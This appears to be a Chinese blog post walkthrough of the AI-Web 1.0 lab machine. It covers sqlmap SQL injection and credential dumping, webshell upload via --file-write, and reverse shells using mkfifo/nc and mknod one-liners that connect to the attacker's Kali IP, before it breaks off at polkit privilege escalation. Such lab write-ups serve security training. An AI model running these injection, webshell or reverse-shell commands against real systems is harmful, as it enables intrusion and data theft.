@@ -1,0 +1,770 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="leigoshi">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="AI Web：一、环境搭建：1.准备工具：渗透kali：   kali中集成了许多渗透相关的工具，可以通过kali为媒介来进行各种渗透i测试； 1kali ip：192.168.190.130  AI Web 靶机：1靶机 ip：192.168.190.187  两台虚拟机使用nat模式，将其分配到同一网段 二、渗透过程：1.信息收集：使用nmap扫描同一网段存活主机： 1130是kali，所以1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AI_Web1.0">
+<meta property="og:url" content="http://example.com/2023/10/07/AI-Web1-0/index.html">
+<meta property="og:site_name" content="我的爱不停步">
+<meta property="og:description" content="AI Web：一、环境搭建：1.准备工具：渗透kali：   kali中集成了许多渗透相关的工具，可以通过kali为媒介来进行各种渗透i测试； 1kali ip：192.168.190.130  AI Web 靶机：1靶机 ip：192.168.190.187  两台虚拟机使用nat模式，将其分配到同一网段 二、渗透过程：1.信息收集：使用nmap扫描同一网段存活主机： 1130是kali，所以1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/10/07/AI-Web1-0/image-20231006115854443.png">
+<meta property="og:image" content="http://example.com/2023/10/07/AI-Web1-0/image-20231006120318943.png">
+<meta property="og:image" content="http://example.com/2023/10/07/AI-Web1-0/image-20231006120726398.png">
+<meta property="og:image" content="http://example.com/2023/10/07/AI-Web1-0/image-20231006120837357.png">
+<meta property="og:image" content="http://example.com/2023/10/07/AI-Web1-0/image-20231006120930957.png">
+<meta property="og:image" content="http://example.com/2023/10/07/AI-Web1-0/image-20231006130035464.png">
+<meta property="og:image" content="http://example.com/2023/10/07/AI-Web1-0/image-20231006132341401.png">
+<meta property="og:image" content="http://example.com/2023/10/07/AI-Web1-0/image-20231006121107512.png">
+<meta property="og:image" content="http://example.com/2023/10/07/AI-Web1-0/image-20231006121323205.png">
+<meta property="og:image" content="http://example.com/2023/10/07/AI-Web1-0/image-20231006123056607.png">
+<meta property="og:image" content="http://example.com/2023/10/07/AI-Web1-0/image-20231006123357431.png">
+<meta property="og:image" content="http://example.com/2023/10/07/AI-Web1-0/image-20231006124541767.png">
+<meta property="og:image" content="http://example.com/2023/10/07/AI-Web1-0/image-20231006144306465.png">
+<meta property="og:image" content="http://example.com/2023/10/07/AI-Web1-0/image-20231006145223034.png">
+<meta property="og:image" content="http://example.com/2023/10/07/AI-Web1-0/image-20231006145800421.png">
+<meta property="og:image" content="http://example.com/2023/10/07/AI-Web1-0/image-20231006145941110.png">
+<meta property="og:image" content="http://example.com/2023/10/07/AI-Web1-0/image-20231006174847744.png">
+<meta property="og:image" content="http://example.com/2023/10/07/AI-Web1-0/image-20231006174828255.png">
+<meta property="og:image" content="http://example.com/2023/10/07/AI-Web1-0/image-20231006175529977.png">
+<meta property="og:image" content="http://example.com/2023/10/07/AI-Web1-0/image-20231007120531029.png">
+<meta property="og:image" content="http://example.com/2023/10/07/AI-Web1-0/image-20231007120859448.png">
+<meta property="og:image" content="http://example.com/2023/10/07/AI-Web1-0/image-20231007090530494.png">
+<meta property="og:image" content="http://example.com/2023/10/07/AI-Web1-0/image-20231007090559155.png">
+<meta property="og:image" content="http://example.com/2023/10/07/AI-Web1-0/image-20231007102207669.png">
+<meta property="og:image" content="http://example.com/2023/10/07/AI-Web1-0/image-20231007102611093.png">
+<meta property="og:image" content="http://example.com/2023/10/07/AI-Web1-0/image-20231007102934074.png">
+<meta property="og:image" content="http://example.com/2023/10/07/AI-Web1-0/image-20231007103455833.png">
+<meta property="og:image" content="http://example.com/2023/10/07/AI-Web1-0/image-20231007103503312.png">
+<meta property="og:image" content="http://example.com/2023/10/07/AI-Web1-0/image-20231007103609334.png">
+<meta property="og:image" content="http://example.com/2023/10/07/AI-Web1-0/image-20231007103659416.png">
+<meta property="article:published_time" content="2023-10-07T04:40:41.000Z">
+<meta property="article:modified_time" content="2023-10-07T04:41:05.960Z">
+<meta property="article:author" content="leigoshi">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2023/10/07/AI-Web1-0/image-20231006115854443.png">
+  
+  
+  
+  <title>AI_Web1.0 - 我的爱不停步</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>我的爱不停步</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="AI_Web1.0"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-10-07 12:40" pubdate>
+          2023年10月7日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          60 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">AI_Web1.0</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="AI-Web："><a href="#AI-Web：" class="headerlink" title="AI Web："></a>AI Web：</h1><h2 id="一、环境搭建："><a href="#一、环境搭建：" class="headerlink" title="一、环境搭建："></a>一、环境搭建：</h2><h3 id="1-准备工具："><a href="#1-准备工具：" class="headerlink" title="1.准备工具："></a>1.准备工具：</h3><h4 id="渗透kali："><a href="#渗透kali：" class="headerlink" title="渗透kali："></a>渗透kali：</h4><p>   kali中集成了许多渗透相关的工具，可以通过kali为媒介来进行各种渗透i测试；</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">kali</span> ip：<span class="hljs-number">192.168.190.130</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="AI-Web-靶机："><a href="#AI-Web-靶机：" class="headerlink" title="AI Web 靶机："></a>AI Web 靶机：</h4><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">靶机 <span class="hljs-built_in">ip</span>：<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">190</span>.<span class="hljs-number">187</span><br></code></pre></td></tr></table></figure>
+
+<p>两台虚拟机使用nat模式，将其分配到同一网段</p>
+<h2 id="二、渗透过程："><a href="#二、渗透过程：" class="headerlink" title="二、渗透过程："></a>二、渗透过程：</h2><h3 id="1-信息收集："><a href="#1-信息收集：" class="headerlink" title="1.信息收集："></a>1.信息收集：</h3><p>使用nmap扫描同一网段存活主机：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">130</span>是kali，所以<span class="hljs-number">187</span>是目标靶机<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/07/AI-Web1-0/image-20231006115854443.png" srcset="/img/loading.gif" lazyload alt="image-20231006115854443"></p>
+<p>扫描目标靶机的信息：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">可以看到目标靶机开放了<span class="hljs-number">80</span>端口，同时还有有一个robots.txt文件，以及两个目录<span class="hljs-regexp">/m3diNf0/</span>和<span class="hljs-regexp">/se3reTdir777/u</span>ploads/ ，linux版本在<span class="hljs-number">3</span>到<span class="hljs-number">4</span>左右<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/07/AI-Web1-0/image-20231006120318943.png" srcset="/img/loading.gif" lazyload alt="image-20231006120318943"></p>
+<p>访问80端口，并查看所扫描到的文件：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">在所提供的文件中找到之前扫描到的目录<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/07/AI-Web1-0/image-20231006120726398.png" srcset="/img/loading.gif" lazyload alt="image-20231006120726398"></p>
+<p>尝试访问两个目录，发现无权访问：</p>
+<p><img src="/2023/10/07/AI-Web1-0/image-20231006120837357.png" srcset="/img/loading.gif" lazyload alt="image-20231006120837357"></p>
+<p><img src="/2023/10/07/AI-Web1-0/image-20231006120930957.png" srcset="/img/loading.gif" lazyload alt="image-20231006120930957"></p>
+<p>扫描目录：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">分别对<span class="hljs-number">192.168</span>.<span class="hljs-number">190.187</span>   http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">190.187</span><span class="hljs-regexp">/m3diNf0/</span> 和 http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">190.187</span><span class="hljs-regexp">/se3reTdir777/u</span>ploads/ 三个进行扫描<br></code></pre></td></tr></table></figure>
+
+<p>只有在扫描：192.168.190.187&#x2F;m3diNf0&#x2F;</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">得到一个phpinfo页面：<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/07/AI-Web1-0/image-20231006130035464.png" srcset="/img/loading.gif" lazyload alt="image-20231006130035464"></p>
+<p>在info.php中找到了网站的绝对路径：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/home/</span>www<span class="hljs-regexp">/html/</span>web1x443290o2sdf92213<span class="hljs-regexp">/m3diNf0/i</span>nfo.php    <span class="hljs-regexp">//</span>绝对路径可以对获取shell提供帮助<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/07/AI-Web1-0/image-20231006132341401.png" srcset="/img/loading.gif" lazyload alt="image-20231006132341401"></p>
+<h3 id="2-漏洞利用："><a href="#2-漏洞利用：" class="headerlink" title="2.漏洞利用："></a>2.漏洞利用：</h3><h4 id="sql注入："><a href="#sql注入：" class="headerlink" title="sql注入："></a>sql注入：</h4><p>对&#x2F;se3reTdir777&#x2F;uploads&#x2F;目录进行回退时发现：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">在<span class="hljs-regexp">/se3reTdir777/</span>目录中存在搜索框，通过测试发现该提交框存在sql注入<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/07/AI-Web1-0/image-20231006121107512.png" srcset="/img/loading.gif" lazyload alt="image-20231006121107512"></p>
+<p>抓包，可以看到变量参数以及post的提交形式，尝试使用sqlmap进行数据收集：</p>
+<p><img src="/2023/10/07/AI-Web1-0/image-20231006121323205.png" srcset="/img/loading.gif" lazyload alt="image-20231006121323205"></p>
+<p>sqlmap的post注入的两种方式：</p>
+<p>（1）：使用-r参数进行注入：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">-r参数的使用需要我们将抓包的内容进行保存（保存到一个文件中） 即：<br>sqlmap -r <span class="hljs-string">&quot;D://1.txt&quot;</span> <br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/07/AI-Web1-0/image-20231006123056607.png" srcset="/img/loading.gif" lazyload alt="image-20231006123056607"></p>
+<p>（2）：使用–data参数进行注入：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-params">--data</span> 只需要我们将所有的post数据复制下来<span class="hljs-params">(抓包所得到的post传入的数据)</span> 即：<br>sqlmap -u <span class="hljs-string">&quot;http://192.168.190.187/se3reTdir777/&quot;</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> <span class="hljs-params">--dbs</span> <span class="hljs-params">--batch</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/07/AI-Web1-0/image-20231006123357431.png" srcset="/img/loading.gif" lazyload alt="image-20231006123357431"></p>
+<p>爆得数据：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://192.168.190.187/se3reTdir777/&quot;</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> -D aiweb1 -tables  <span class="hljs-params">--dump</span> <span class="hljs-params">--batch</span><br>在aiweb1的数据库中存在两张表分别是user表和systemUser表，在systemUser表中找到了用户名和base64加密后的密码<br>		t00r：       FakeUserPassw0rd                <span class="hljs-string">//base64</span>解密后提示假的用户密码 <br>		aiweb1pwn：  MyEvilPass_f908sdaf9_sadfasf0sa <br>		u3er：       N0tThis0neA<span class="hljs-keyword">ls</span>0 <br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/07/AI-Web1-0/image-20231006124541767.png" srcset="/img/loading.gif" lazyload alt="image-20231006124541767"></p>
+<p>找不到其他有用的东西，尝试sqlmap获取shell：</p>
+<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">sqlmap 使用</span> <span class="hljs-literal">--</span><span class="hljs-comment">os</span><span class="hljs-literal">-</span><span class="hljs-comment">shell的前置条件（普通注入</span><span class="hljs-literal">--</span><span class="hljs-comment">os</span><span class="hljs-literal">-</span><span class="hljs-comment">shell主要是通过上传一个sqlmap的马，然后通过马来进行命令执行）：</span><br></code></pre></td></tr></table></figure>
+
+<p>①：是否存在注入点</p>
+<p>②：在使用 –os-shell 获取操作系统 shell 的时候，要先确定当前用户是否为管理员权限（主要是为了对靶机的目录或文件进行读写操作）</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://192.168.190.187/se3reTdir777/index.php&quot;</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> <span class="hljs-params">--is-dba</span> <span class="hljs-params">--current-user</span> <br><span class="hljs-string">//</span>可以看到当前的用户为aiweb1user@localhost，且不是DBA，正常情况下是无法继续往下进行的，但存在一个<span class="hljs-string">/se3reTdir777/uploads</span>目录，该目录的功能大概是文件上传，可以通过该目录的绝对路径，来上传文件执行<span class="hljs-params">--os-shell</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/07/AI-Web1-0/image-20231006144306465.png" srcset="/img/loading.gif" lazyload alt="image-20231006144306465"></p>
+<p>接下来尝试使用–os-shell来进行shell：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://192.168.190.187/se3reTdir777/index.php&quot;</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span>  <span class="hljs-params">--os-shell</span><br><span class="hljs-string">//</span>选择默认的PHP语言<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/07/AI-Web1-0/image-20231006145223034.png" srcset="/img/loading.gif" lazyload alt="image-20231006145223034"></p>
+<p>选择可以进行写的目录：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/home/</span>www<span class="hljs-regexp">/html/</span>web1x443290o2sdf92213<span class="hljs-regexp">/se3reTdir777/u</span>ploads/   <br><span class="hljs-regexp">//</span>尝试使用其他的绝对路径不行，只有uploads可以，可能是因为当前的用户权限不够<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/07/AI-Web1-0/image-20231006145800421.png" srcset="/img/loading.gif" lazyload alt="image-20231006145800421"></p>
+<p>可以看到执行后以及获取到了shell：</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">此时的<span class="hljs-keyword">shell</span><span class="language-bash">权限极低，想办法提权，在提权之前，需要建立一个交互式界面，方便一些命令的执行</span><br>nc -e 是不能直接使用的，目前最简单的方法：知道绝对路径，可以上传/写入文件进行蚁剑连接<br>									或者上传反弹<span class="hljs-keyword">shell</span><span class="language-bash">脚本	</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/07/AI-Web1-0/image-20231006145941110.png" srcset="/img/loading.gif" lazyload alt="image-20231006145941110"></p>
+<h3 id="3-权限提升："><a href="#3-权限提升：" class="headerlink" title="3.权限提升："></a>3.权限提升：</h3><h4 id="直接写入php文件："><a href="#直接写入php文件：" class="headerlink" title="直接写入php文件："></a>直接写入php文件：</h4><p>通过sqlmap直接写入文件进行：</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sqlmap -u <span class="hljs-string">&quot;http://192.168.190.187/se3reTdir777/&quot;</span> --data <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> --<span class="hljs-keyword">file</span>-<span class="hljs-keyword">write</span> <span class="hljs-number">1</span>.php --<span class="hljs-keyword">file</span>-dest <span class="hljs-regexp">/home/</span>www<span class="hljs-regexp">/html/</span>web1x443290o2sdf92213<span class="hljs-regexp">/se3reTdir777/u</span>ploads/<span class="hljs-number">1</span>.php    <br>                               <span class="hljs-comment">//1.php是一句话脚本</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/07/AI-Web1-0/image-20231006174847744.png" srcset="/img/loading.gif" lazyload alt="image-20231006174847744"></p>
+<p><img src="/2023/10/07/AI-Web1-0/image-20231006174828255.png" srcset="/img/loading.gif" lazyload alt="image-20231006174828255"></p>
+<p>接下来通过蚁剑进行连接：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">url为：http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">190.187</span><span class="hljs-regexp">/se3reTdir777/u</span>ploads/<span class="hljs-number">1</span>.php<br>虽然绝对路径为：<span class="hljs-regexp">/home/</span>www<span class="hljs-regexp">/html/</span>web1x443290o2sdf92213<span class="hljs-regexp">/se3reTdir777/u</span>ploads/<span class="hljs-number">1</span>.php<br>但是我们访问时依旧时为http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">190.187</span><span class="hljs-regexp">/se3reTdir777/u</span>ploads/<span class="hljs-number">1</span>.php<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/07/AI-Web1-0/image-20231006175529977.png" srcset="/img/loading.gif" lazyload alt="image-20231006175529977"></p>
+<h4 id="wget下载php文件："><a href="#wget下载php文件：" class="headerlink" title="wget下载php文件："></a>wget下载php文件：</h4><p>在kali上开启www服务，在靶机上下载kali上的php反弹脚本：</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">kali自带的有<span class="hljs-keyword">shell</span><span class="language-bash">脚本</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/07/AI-Web1-0/image-20231007120531029.png" srcset="/img/loading.gif" lazyload alt="image-20231007120531029"></p>
+<p>靶机通过wget命令下载：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">190.130</span>/shell.php<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/07/AI-Web1-0/image-20231007120859448.png" srcset="/img/loading.gif" lazyload alt="image-20231007120859448"></p>
+<p>接下来可以在我们的虚拟终端上进行反弹shell，开启友好的终端交互界面，同时方便一些命令的实施：</p>
+<p>首先在kali机中开启监听：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">监听6666端口<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/07/AI-Web1-0/image-20231007090530494.png" srcset="/img/loading.gif" lazyload alt="image-20231007090530494"></p>
+<p>由于无法使用nc中 -e参数，所以尝试使用其他命令进行反弹shell：</p>
+<h4 id="通过创建管道来将nc反弹命令成功执行："><a href="#通过创建管道来将nc反弹命令成功执行：" class="headerlink" title="通过创建管道来将nc反弹命令成功执行："></a>通过创建管道来将nc反弹命令成功执行：</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">rm <span class="hljs-regexp">/tmp/</span>z;mkfifo<span class="hljs-regexp">/tmp/</span>f;cat <span class="hljs-regexp">/tmp/</span>f|<span class="hljs-regexp">/bin/</span>sh -i <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>|nc <span class="hljs-number">192.168</span>.<span class="hljs-number">190.130</span> <span class="hljs-number">6666</span> &gt; <span class="hljs-regexp">/tmp/</span>z<br><br><span class="hljs-regexp">/tmp/</span>z 必须是不存在的文件 通过mkfifo建立先进先出的管道，cat命令将管道里面的内容输出传递给<span class="hljs-regexp">/bin/</span>sh，sh会执行管道里的命令并将标准输入和标准错误输出结果通过nc传到该管道，由此形成一个回路<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">mknod backpipe p; nc <span class="hljs-number">192.168</span>.<span class="hljs-number">190.130</span> <span class="hljs-number">6666</span> <span class="hljs-number">0</span>&lt;backpipe | <span class="hljs-regexp">/bin/</span>bash <span class="hljs-number">1</span>&gt;backpipe <span class="hljs-number">2</span>&gt;backpipe<br>通过mknod建立FIFO管道backpipe ，用来nc和<span class="hljs-regexp">/bin/</span>bash之间传输数据 <br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/07/AI-Web1-0/image-20231007090559155.png" srcset="/img/loading.gif" lazyload alt="image-20231007090559155"></p>
+<p><img src="/2023/10/07/AI-Web1-0/image-20231007102207669.png" srcset="/img/loading.gif" lazyload alt="image-20231007102207669"></p>
+<p>find命令查看可以用来的提权有哪些：</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">find</span> / -perm <span class="hljs-number">-4000</span> <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span>    <span class="hljs-comment">//发现存在polkit程序</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/07/AI-Web1-0/image-20231007102611093.png" srcset="/img/loading.gif" lazyload alt="image-20231007102611093"></p>
+<h4 id="polkit提权（提权方法不唯一）："><a href="#polkit提权（提权方法不唯一）：" class="headerlink" title="polkit提权（提权方法不唯一）："></a>polkit提权（提权方法不唯一）：</h4><p>polkit影响的版本有：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ubuntu14</span>.<span class="hljs-number">04</span>----<span class="hljs-number">20</span>.<span class="hljs-number">04</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/07/AI-Web1-0/image-20231007102934074.png" srcset="/img/loading.gif" lazyload alt="image-20231007102934074"></p>
